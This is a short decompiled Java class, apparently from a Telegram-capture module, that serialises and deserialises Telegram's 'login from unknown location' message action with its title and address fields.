package com.vvt.capture.telegram.internal;

public class TLRPC$TL_messageActionLoginUnknownLocation
  extends TLRPC.MessageAction
{
  public static int constructor = 1431655925;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    String str = paramAbstractSerializedData.readString(paramBoolean);
    this.title = str;
    str = paramAbstractSerializedData.readString(paramBoolean);
    this.address = str;
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    String str = this.title;
    paramAbstractSerializedData.writeString(str);
    str = this.address;
    paramAbstractSerializedData.writeString(str);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_messageActionLoginUnknownLocation.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */